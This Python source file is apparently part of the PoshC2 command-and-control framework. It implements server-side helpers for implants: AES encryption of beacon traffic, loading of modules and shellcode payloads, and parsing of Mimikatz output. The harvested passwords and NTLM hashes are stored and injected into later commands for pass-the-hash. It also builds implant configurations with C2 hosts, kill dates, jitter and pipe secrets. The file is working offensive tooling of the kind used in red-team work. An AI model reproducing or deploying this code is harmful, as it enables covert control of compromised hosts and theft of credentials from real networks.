import base64
import codecs
import functools
import glob
import gzip
import io
import os
import random
import re
from datetime import datetime

import pefile
from Crypto.Cipher import AES

from poshc2 import Colours
from poshc2 import banner
from poshc2.Utils import new_implant_id
from poshc2.server.Config import POST_200_Responses, PayloadsDirectory, BeaconDataDirectory, ModulesDirectory
from poshc2.server.Config import mitre_mapping
from poshc2.server.database.Helpers import insert_object, get_cred, get_implant, get_implant_by_numeric_id
from poshc2.server.database.Model import Cred


def number_of_days(date1, date2):
    return (date2 - date1).days


def default_response():
    return bytes((random.choice(POST_200_Responses)).replace("#RANDOMDATA#", new_implant_id()), "utf-8")


def load_module(module_name):
    if module_name.startswith("/"):
        module_source = codecs.open(module_name, 'r', encoding='utf-8-sig')
    else:
        module_source = codecs.open(f'{ModulesDirectory}{module_name}', 'r', encoding='utf-8-sig')

    return module_source.read()


def print_compile_time(module_name):
    compile_time = pefile.PE(module_name).FILE_HEADER.TimeDateStamp
    print(f"{Colours.YELLOW}\n{module_name} was compiled at: {datetime.utcfromtimestamp(compile_time).strftime('%Y-%m-%d %H:%M:%S')}{Colours.END}")


def load_module_sharp(module_name, subdir=""):
    if module_name.startswith("/"):
        if module_name.lower().endswith(".exe") or module_name.lower().endswith(".dll"):
            print_compile_time(module_name)

        module_source = open(module_name, 'r+b')
    else:
        module_full_filepath = f"{ModulesDirectory}{subdir}{module_name}"

        if module_name.lower().endswith(".exe") or module_name.lower().endswith(".dll"):
            print_compile_time(module_full_filepath)

        module_source = open(module_full_filepath, 'r+b')

    return base64.b64encode(module_source.read()).decode("utf-8")


def get_images():
    images = ""

    for root, dirs, filenames in os.walk(BeaconDataDirectory):
        count = 1

        for f in filenames:
            if count == 5:
                with open(BeaconDataDirectory + f, "rb") as image_file:
                    image = image_file.read()

                    if len(image) < 1500:
                        images += f"\"{base64.b64encode(image).decode('utf-8')}\""

            if count < 5:
                with open(BeaconDataDirectory + f, "rb") as image_file:
                    image = image_file.read()

                    if len(image) < 1500:
                        images += f"\"{base64.b64encode(image).decode('utf-8')}\","

            count += 1

    return images


# Decrypt a string from base64 encoding
def get_encryption(key, iv='0123456789ABCDEF'):
    iv = os.urandom(AES.block_size)
    bkey = base64.b64decode(key)
    aes = AES.new(bkey, AES.MODE_CBC, iv)
    return aes


def decrypt(key, data):
    iv = data[0:16]
    aes = get_encryption(key, iv)
    data = aes.decrypt(base64.b64decode(data))
    return data[16:].decode("utf-8")


def decrypt_bytes(key, data):
    iv = data[0:16]
    aes = get_encryption(key, iv)
    data = aes.decrypt(data)

    try:
        data = data[16:].decode("utf-8")
    except Exception:
        data = data[16:]

    return data


def decrypt_bytes_gzip(key, data):
    iv = data[0:16]
    aes = get_encryption(key, iv)
    data = aes.decrypt(data)

    import gzip
    data = gzip.decompress(data[16:])

    try:
        data = data.decode("utf-8")
    except Exception:
        data = data

    return data


def encrypt(key, data, gzipdata=False):
    if not gzipdata:
        try:
            data = base64.b64encode(data)
        except TypeError:
            data = base64.b64encode(bytes(data, 'utf-8'))

    if gzipdata:
        data = bytes(data, 'utf-8')
        print("Gzipping data - pre-zipped len, " + str(len(data)))
        out = io.BytesIO()

        with gzip.GzipFile(fileobj=out, mode="w") as f:
            f.write(data)

        data = out.getvalue()

    # Pad with zeros
    mod = len(data) % 16
    # if mod != 0:
    newlen = len(data) + (16 - mod)

    try:
        data = data.ljust(newlen, '\0')
    except TypeError:
        data = data.ljust(newlen, bytes('\0', "utf-8"))

    aes = get_encryption(key, os.urandom(16))
    data = aes.IV + aes.encrypt(data)

    if not gzipdata:
        data = base64.b64encode(data)

    return data


def filecomplete(text, state):
    os.chdir(PayloadsDirectory)
    return (glob.glob(text + '*') + [None])[state]


def gzipdata(data):
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
        f.write(data)
    data = out.getvalue()
    return base64.b64encode(data).decode('utf-8')


def shellcodefilecomplete(text, state):
    os.chdir(PayloadsDirectory)
    return (glob.glob(text + '*' + ".bin") + [None])[state]


def get_cred_from_params(params, user):
    if "-credid" in params:
        p = re.compile(r"-credid (\w*)")
        credId = re.search(p, params)
        params = p.sub("", params)

        if credId:
            credId = credId.group(1)
        else:
            print(Colours.RED, "Please specify a credid", Colours.GREEN)

        cred = get_cred(credId)

        if cred is None:
            print(Colours.RED, f"Unrecognised CredID: {credId}", Colours.GREEN)

        return cred, params
    else:
        print(Colours.RED, "Command does not contain -credid", Colours.GREEN)


def creds(accept_hashes=True):
    """
    Decorator around commands that allows credentials to be passed as '-credid <id>' parameters with an appropriate ID.

    Wraps the function replacing '-credid <id>' with '-domain <domain> -user <user> -pass <password>' (or '-hash <hash>' if the credid is a hash type).

    The wrapped function must take the arguments 'user, command, implant_id'.

    The decorator can take an 'accept_hashes' argument, e.g. '@creds(accept_hashes = False)' to disable the use of hash credential IDs.
    """

    def decorator(func):

        @functools.wraps(func)
        def wrapper(*args, **kwargs):

            user = args[0]
            command = args[1]
            implant_id = args[2]

            if "-credid" in command:
                cred, command = get_cred_from_params(command, user)

                if creds is None:
                    return

                if cred.password:
                    command = command + f" -domain {cred.domain} -user {cred.username} -pass {cred.password}"
                elif not accept_hashes:
                    print_bad("This command does not support hash authentication")
                    return
                else:
                    command = command + f" -domain {cred.domain} -user {cred.username} -hash {cred.hash}"

            output = func(user, command, implant_id)
            return output

        return wrapper

    return decorator


def print_good(message):
    print(f"{Colours.GREEN}{message}")


def print_bad(message):
    print(f"{Colours.RED}{message}{Colours.GREEN}")


def process_mimikatz(lines):
    # code source https://github.com/stufus/parse-mimikatz-log/blob/master/pml.py
    main_count = 0
    current = {}

    for line in lines.split('\n'):
        main_count += 1
        val = re.match(r'^\s*\*\s+Username\s+:\s+(.+)\s*$', line.strip())

        if val is not None:
            current = {'Username': val.group(1).strip()}

            if current['Username'] == '(null)':
                current['Username'] = None

            continue

        val = re.match(r'^\s*\*\s+Domain\s+:\s+(.+)\s*$', line.strip())

        if val is not None:
            current['Domain'] = val.group(1).strip()

            if current['Domain'] == '(null)':
                current['Domain'] = None

            continue

        val = re.match(r'^\s*\*\s+(NTLM|Password)\s+:\s+(.+)\s*$', line.strip())

        if val is not None and "Username" in current and "Domain" in current:
            if val.group(2).count(" ") < 10:
                current[val.group(1).strip()] = val.group(2)

                if val.group(1) == "Password":
                    if val.group(2) == '(null)':
                        continue

                    cred = Cred(
                        domain=current['Domain'],
                        username=current['Username'],
                        password=current['Password'],
                        hash=None
                    )

                    insert_object(cred)
                elif val.group(1) == "NTLM":
                    if val.group(2) == '(null)':
                        continue

                    cred = Cred(
                        domain=current['Domain'],
                        username=current['Username'],
                        password=None,
                        hash=current['NTLM']
                    )

                    insert_object(cred)


def clear():
    try:
        os.system('clear')
    except Exception:
        print("cls")
        print(chr(27) + "[2J")

    print(Colours.GREEN)
    print(banner)


def search_help(command, commands_help):
    search_term = command.replace("search-help ", "")
    verbose = False

    if "-verbose" in search_term:
        search_term = search_term.replace("-verbose", "").strip()
        verbose = True

    findings = []
    findings.append("")

    for command in commands_help.keys():
        added = False

        if search_term.lower().strip() in command:
            findings.append(command)
            added = True

        if verbose:
            if added or search_term in commands_help[command].lower():
                if not added:
                    findings.append(command)

                mitre_ttps = search_mitre_ttps(command)

                if mitre_ttps:
                    findings.append(commands_help[command].format(mitre_ttps))
                else:
                    findings.append(commands_help[command])

                findings.append("--------------------------")
                findings.append("")

    if not verbose:
        findings = sorted(findings)
        findings.append("")

    for line in findings[:-1]:
        print_good(line)


def print_command_help(command, commands, commands_help, block_help):
    """
    Displays a list of all the available commands for this implant, or
    help for a particular command if specified.

    Examples:
        help
        help list-modules
        help inject-shellcode
    """
    print_good("")

    if command == 'help':
        print("\n")

        for tag in sorted(block_help):
            print_good(tag)
            print_good("=" * len(tag))
            print_good(block_help[tag])

        print_good(f"\nFor help with a particular command run {Colours.BLUE}help <command>{Colours.GREEN}")

    else:
        help_command = command[4:].strip()

        if help_command in commands_help:
            if commands_help[help_command]:
                mitre_ttps = search_mitre_ttps(help_command)

                if mitre_ttps:
                    print_good(f"    {commands_help[help_command].strip().format(mitre_ttps)}")
                else:
                    print_good(f"    {commands_help[help_command].strip()}")
            else:
                print_bad(f"No help available for command: {help_command}")
        elif help_command.title() in block_help:
            print("\n")
            print_good(help_command.title())
            print_good("=" * len(help_command))
            print_good(block_help[help_command.title()])
            print_good("\n")
        else:
            print_bad(f"Command not recognised: {help_command}")


def get_parent_implant(implant_id):
    implant = get_implant(implant_id)
    if implant.label is None:
        return None

    parent_implant_numeric_id = re.search(r'(?<=\s)\S*', implant.label).group()

    if parent_implant_numeric_id is None:
        print(f"Error retreiving parent, unable to retrieve implant id from label: {parent_implant_numeric_id}")
        return

    return get_implant_by_numeric_id(parent_implant_numeric_id)


def search_mitre_ttps(command):
    mitre_ttps = ""

    for mapped_command in mitre_mapping:
        if mapped_command["command"] == command:
            for ttp in mapped_command["ttps"]:
                mitre_ttps += "{0} - {1} ({2})\n        ".format(ttp["id"], ttp["name"], ", ".join(tactic for tactic in ttp["tactics"]))

    if mitre_ttps:
        return mitre_ttps.strip()
    else:
        return "None"


def build_sharp_config(stage_comms_hosts="", stage_comms_headers="", beacon_comms_hosts="", beacon_comms_headers="",
                       stage_uri="", kill_date="", encryption_key="", implant_id="", beacon_uris="", beacon_images="",
                       user_agent="", referrer_header="", proxy_url="", proxy_user="", proxy_password="", url_id="",
                       payload_domain_check="", stage_retries="", stage_retries_limit="", stage_retries_initial_wait="",
                       jitter="", sleep="", pbind_pipe_name="", pbind_secret="", fcomm_file_path=""):
    config_template = "#REPLACESTAGERRETRIES#;#REPLACESTAGERRETRIESLIMIT#;#REPLACESTAGERRETRIESWAIT#;#REPLACEMEDOMAIN#;#REPLACEPROXYURL#;#REPLACEPROXYUSER#;" \
                      "#REPLACEPROXYPASSWORD#;#REPLACEUSERAGENT#;#REPLACEREFERER#;#REPLACEKILLDATE#;#REPLACEURLID#;#REPLACESTAGECOMMS#;" \
                      "#REPLACEBEACONCOMMS#;#REPLACEURIS#;#REPLACEIMPLANTID#;#REPLACESTAGEURI#;#REPLACEBEACONIMAGES#;#REPLACESLEEP#;" \
                      "#REPLACEJITTER#;#REPLACEKEY#;#PBINDPIPENAME#;#PBINDSECRET#;#FCOMMFILEPATH#"

    stage_comms = ""

    if stage_comms_hosts:
        connect_urls_split = stage_comms_hosts.split(",")
        connect_headers_split = stage_comms_headers.split(",")

        for x in range(len(connect_urls_split)):
            sanitised_host = connect_urls_split[x].replace('"', '')
            sanitised_header = connect_headers_split[x].replace('"', '')
            stage_comms += f"{sanitised_host},{sanitised_header}#"

        stage_comms = stage_comms[:-1]

    beacon_comms = ""

    if beacon_comms_hosts:
        beacon_urls_split = beacon_comms_hosts.split(",")
        beacon_headers_split = beacon_comms_headers.split(",")

        for x in range(len(beacon_urls_split)):
            sanitised_host = beacon_urls_split[x].replace('"', '')
            sanitised_header = beacon_headers_split[x].replace('"', '')
            beacon_comms += f"{sanitised_host},{sanitised_header}#"

        beacon_comms = beacon_comms[:-1]

    beacon_uris = beacon_uris.replace('"', "")

    if stage_uri:
        stage_uri = stage_uri + "?c"

    return config_template \
        .replace("#REPLACESTAGECOMMS#", stage_comms) \
        .replace("#REPLACEBEACONCOMMS#", beacon_comms) \
        .replace("#REPLACESTAGEURI#", stage_uri) \
        .replace("#REPLACEKILLDATE#", kill_date) \
        .replace("#REPLACEKEY#", encryption_key) \
        .replace("#REPLACEIMPLANTID#", implant_id) \
        .replace("#REPLACEURIS#", beacon_uris) \
        .replace("#REPLACEBEACONIMAGES#", beacon_images) \
        .replace("#REPLACEUSERAGENT#", base64.b64encode(user_agent.encode("utf-8")).decode("utf-8")) \
        .replace("#REPLACEREFERER#", referrer_header) \
        .replace("#REPLACEPROXYURL#", proxy_url) \
        .replace("#REPLACEPROXYUSER#", proxy_user) \
        .replace("#REPLACEPROXYPASSWORD#", proxy_password) \
        .replace("#REPLACEURLID#", str(url_id)) \
        .replace("#REPLACEMEDOMAIN#", str(payload_domain_check)) \
        .replace("#REPLACESTAGERRETRIESLIMIT#", str(stage_retries_limit).lower()) \
        .replace("#REPLACESTAGERRETRIES#", str(stage_retries).lower()) \
        .replace("#REPLACESTAGERRETRIESWAIT#", str(stage_retries_initial_wait)) \
        .replace("#REPLACEJITTER#", str(jitter)) \
        .replace("#REPLACESLEEP#", str(sleep)) \
        .replace("#PBINDPIPENAME#", pbind_pipe_name) \
        .replace("#PBINDSECRET#", pbind_secret) \
        .replace("#FCOMMFILEPATH#", fcomm_file_path) 
